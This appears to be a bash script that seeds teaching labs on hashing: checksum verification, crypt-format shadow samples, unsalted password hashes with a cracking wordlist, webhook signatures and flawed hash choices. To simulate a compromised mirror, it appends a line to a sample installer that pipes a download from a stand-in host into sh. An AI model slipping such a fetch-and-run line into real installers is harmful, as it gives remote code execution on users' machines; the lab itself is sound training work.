#!/bin/bash
# Seeds the A04.1 hashing labs.
#
# Everything here is generated at container start rather than baked into the
# image, because two of the labs turn on hashes being *computed* rather than
# quoted — a learner who suspects a digest was hand-written learns nothing from
# matching it.
#
# The one exception is the shadow samples, which are deliberately historical:
# DES crypt and md5crypt are what you find on machines nobody has looked at in
# fifteen years, and the point of reading them is to recognise them.
#
# Nothing here is secret and nothing leaves the session's tmpfs.
set -euo pipefail

# ---------------------------------------------------------------- downloads
#
# A release directory as a project would publish it: several files and a
# SHA256SUMS covering them. One file has been modified after the sums were
# written, which is the entire lesson.

D=/tmp/downloads
mkdir -p "$D"

cat > "$D/installer.sh" <<'EOF'
#!/bin/sh
# groundwork-agent installer, v2.4.1
set -e
echo "Installing groundwork-agent..."
install -m 0755 ./agent /usr/local/bin/groundwork-agent
echo "Done."
EOF

cat > "$D/agent.conf" <<'EOF'
endpoint = https://collector.internal:4317
interval = 30s
log_level = info
EOF

cat > "$D/README.txt" <<'EOF'
groundwork-agent 2.4.1

Verify before installing:

    sha256sum -c SHA256SUMS

Do not run the installer if any file reports FAILED.
EOF

# Sums are written now, over the honest content.
( cd "$D" && sha256sum installer.sh agent.conf README.txt > SHA256SUMS )

# ...and then one file is modified, exactly as a compromised mirror would.
# A single appended line: the file still looks entirely reasonable.
cat >> "$D/installer.sh" <<'EOF'
curl -s http://198.51.100.7/x | sh
EOF

# --------------------------------------------------------------- shadow samples
#
# Real crypt-format strings covering the algorithms still found in the wild.
# The passwords are all `hunter2` so a learner can prove which is which.

S=/tmp/shadow-samples
mkdir -p "$S"

{
  printf 'ancient:%s:19000:0:99999:7:::\n' "$(openssl passwd -1 -salt 'oldsalt1' hunter2)"
  printf 'default5:%s:19800:0:99999:7:::\n' "$(openssl passwd -5 -salt 'k2Lp9QmX' hunter2)"
  printf 'default6:%s:19800:0:99999:7:::\n' "$(openssl passwd -6 -salt 'k2Lp9QmX' hunter2)"
  printf 'tuned6:%s:20100:0:99999:7:::\n' "$(openssl passwd -6 -salt 'rounds=1000000$k2Lp9QmX' hunter2)"
  printf 'locked:!:20100:0:99999:7:::\n'
  printf 'nopasswd::20100:0:99999:7:::\n'
} > "$S/shadow.sample"

# Two accounts that chose the same password, stored without a salt. This is the
# pattern a learner is asked to spot by sorting.
{
  echo "# users.csv — exported from an application database"
  echo "id,email,password_hash"
  echo "1,ana@example.com,$(printf 'summer2019' | sha256sum | cut -d' ' -f1)"
  echo "2,ben@example.com,$(printf 'correct horse battery staple' | sha256sum | cut -d' ' -f1)"
  echo "3,cara@example.com,$(printf 'summer2019' | sha256sum | cut -d' ' -f1)"
  echo "4,dev@example.com,$(printf 'summer2019' | sha256sum | cut -d' ' -f1)"
  echo "5,eve@example.com,$(printf 'Tr0ub4dor&3' | sha256sum | cut -d' ' -f1)"
  echo "6,fin@example.com,$(printf 'summer2019' | sha256sum | cut -d' ' -f1)"
} > "$S/users.csv"

# A candidate list an attacker would run first. Deliberately short: the point is
# that the four most obvious guesses cover most of the table.
cat > "$S/wordlist.txt" <<'EOF'
123456
password
summer2019
qwerty
letmein
hunter2
EOF

# ------------------------------------------------------------------- webhook
#
# A delivered request and its signature header, plus a second delivery whose
# body was altered in transit.

W=/tmp/webhook
mkdir -p "$W"

SECRET='whsec_7Kd92mQpLx4vNs1a'
printf '%s' "$SECRET" > "$W/shared-secret"

printf '{"event":"payment.succeeded","amount":1200,"currency":"gbp"}' > "$W/delivery-1.json"
printf '{"event":"payment.succeeded","amount":9900,"currency":"gbp"}' > "$W/delivery-2.json"

# delivery-1 carries a signature computed over its own body.
{
  printf 'X-Signature: sha256='
  openssl dgst -sha256 -hmac "$SECRET" -r < "$W/delivery-1.json" | cut -d' ' -f1
} > "$W/delivery-1.headers"

# delivery-2 carries the signature from delivery-1 — the amount was changed
# after signing, which is what verification is supposed to catch.
cp "$W/delivery-1.headers" "$W/delivery-2.headers"

# ------------------------------------------------------------------- systems
#
# Four services that each chose a hash. Each choice is defensible-sounding and
# exactly one of the four is right.

Y=/tmp/systems
mkdir -p "$Y"

cat > "$Y/alpha.txt" <<'EOF'
service: alpha — customer login
what it stores: sha256(password), no salt
why they chose it: "SHA-256 is a modern, secure, NIST-approved hash."
scale: 2.4 million accounts
EOF

cat > "$Y/bravo.txt" <<'EOF'
service: bravo — internal artefact registry
what it stores: sha256(file contents), used as the artefact's name
why they chose it: "SHA-256 is fast enough to hash a 4GB build output."
scale: ~800 artefacts per day
EOF

cat > "$Y/charlie.txt" <<'EOF'
service: charlie — partner API request signing
what it stores: nothing; sends sha256(shared_secret + request_body) as a header
why they chose it: "The secret is mixed in, so only we can produce the value."
scale: 40 partners, 3 million requests per day
EOF

cat > "$Y/delta.txt" <<'EOF'
service: delta — analytics pipeline
what it stores: sha256(email_address) as the "anonymised" user identifier
why they chose it: "Hashing is one-way, so the emails cannot be recovered."
scale: 11 million distinct addresses
EOF

echo "Seeded: /tmp/downloads, /tmp/shadow-samples, /tmp/webhook, /tmp/systems."
